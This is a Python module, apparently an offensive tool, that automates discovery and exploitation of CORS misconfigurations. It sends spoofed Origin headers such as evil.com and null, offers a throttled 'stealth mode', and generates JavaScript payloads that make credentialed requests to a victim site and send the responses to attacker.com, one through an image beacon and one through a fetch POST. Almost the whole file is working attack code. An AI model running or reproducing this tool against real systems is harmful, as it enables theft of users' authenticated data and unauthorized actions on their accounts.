"""
CORS Exploitation Automation Module
Automates discovery and exploitation of CORS misconfigurations
"""
import asyncio
import aiohttp
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
import json

class CORSExploiter:
    """Automated CORS misconfiguration exploitation"""
    
    def __init__(self, target: str, stealth_mode: bool = False):
        self.target = target
        self.stealth_mode = stealth_mode
        self.findings: List[Dict] = []
        self.tested_endpoints: List[str] = []
        
        self.test_origins = [
            "null",
            "https://evil.com",
            "https://attacker.com",
            f"https://{urlparse(target).netloc}.evil.com",
            f"https://evil.{urlparse(target).netloc}",
            f"https://{urlparse(target).netloc}evil.com",
            "https://localhost",
            "https://127.0.0.1",
            f"http://{urlparse(target).netloc}",
        ]
        
        self.exploit_payloads = {
            "credential_theft": """
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '{target}/api/sensitive', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {{
    if (xhr.readyState == 4 && xhr.status == 200) {{
        new Image().src = 'https://attacker.com/steal?data=' + encodeURIComponent(xhr.responseText);
    }}
}};
xhr.send();
</script>
""",
            "csrf_action": """
<script>
fetch('{target}/api/action', {{
    method: 'POST',
    credentials: 'include',
    headers: {{'Content-Type': 'application/json'}},
    body: JSON.stringify({{action: 'malicious'}})
}}).then(r => r.text()).then(d => {{
    fetch('https://attacker.com/exfil', {{method: 'POST', body: d}});
}});
</script>
"""
        }
    
    async def scan(self, endpoints: Optional[List[str]] = None) -> List[Dict]:
        """Scan target for CORS vulnerabilities"""
        if endpoints is None:
            endpoints = [self.target]
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            for endpoint in endpoints:
                for origin in self.test_origins:
                    tasks.append(self._test_origin(session, endpoint, origin))
            
            if self.stealth_mode:
                for task in tasks:
                    await task
                    await asyncio.sleep(0.5)
            else:
                await asyncio.gather(*tasks, return_exceptions=True)
        
        return self.findings
    
    async def _test_origin(self, session: aiohttp.ClientSession, endpoint: str, origin: str):
        """Test specific origin against endpoint"""
        try:
            headers = {
                "Origin": origin,
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            
            async with session.get(endpoint, headers=headers, timeout=10) as response:
                cors_origin = response.headers.get("Access-Control-Allow-Origin", "")
                cors_credentials = response.headers.get("Access-Control-Allow-Credentials", "")
                cors_methods = response.headers.get("Access-Control-Allow-Methods", "")
                
                vuln_type = None
                severity = "Info"
                
                if cors_origin == "*" and cors_credentials.lower() == "true":
                    vuln_type = "CRITICAL: Wildcard origin with credentials"
                    severity = "Critical"
                elif cors_origin == "null":
                    vuln_type = "HIGH: Null origin allowed"
                    severity = "High"
                elif cors_origin == origin and origin.startswith("https://evil"):
                    vuln_type = "CRITICAL: Arbitrary origin reflection"
                    severity = "Critical"
                elif cors_origin == origin and "attacker" in origin:
                    vuln_type = "HIGH: Origin reflection vulnerability"
                    severity = "High"
                elif cors_origin == origin and urlparse(origin).netloc != urlparse(self.target).netloc:
                    vuln_type = "MEDIUM: External origin allowed"
                    severity = "Medium"
                
                if vuln_type:
                    finding = {
                        "type": "CORS Misconfiguration",
                        "endpoint": endpoint,
                        "origin_tested": origin,
                        "vulnerability": vuln_type,
                        "severity": severity,
                        "headers": {
                            "Access-Control-Allow-Origin": cors_origin,
                            "Access-Control-Allow-Credentials": cors_credentials,
                            "Access-Control-Allow-Methods": cors_methods
                        },
                        "exploit_available": True if severity in ["Critical", "High"] else False
                    }
                    self.findings.append(finding)
                    
        except Exception as e:
            pass
    
    def generate_exploit(self, finding: Dict) -> str:
        """Generate exploit payload for a CORS finding"""
        if finding.get("severity") not in ["Critical", "High"]:
            return "No exploit available for this severity level"
        
        endpoint = finding.get("endpoint", self.target)
        
        if "credentials" in finding.get("vulnerability", "").lower():
            return self.exploit_payloads["credential_theft"].format(target=endpoint)
        else:
            return self.exploit_payloads["csrf_action"].format(target=endpoint)
    
    async def auto_exploit(self) -> List[Dict]:
        """Automatically scan and generate exploits"""
        await self.scan()
        
        results = []
        for finding in self.findings:
            exploit = self.generate_exploit(finding)
            results.append({
                **finding,
                "exploit_payload": exploit if finding.get("exploit_available") else None
            })
        
        return results
    
    def get_report(self) -> Dict:
        """Generate exploitation report"""
        return {
            "target": self.target,
            "total_findings": len(self.findings),
            "critical": len([f for f in self.findings if f["severity"] == "Critical"]),
            "high": len([f for f in self.findings if f["severity"] == "High"]),
            "findings": self.findings
        }
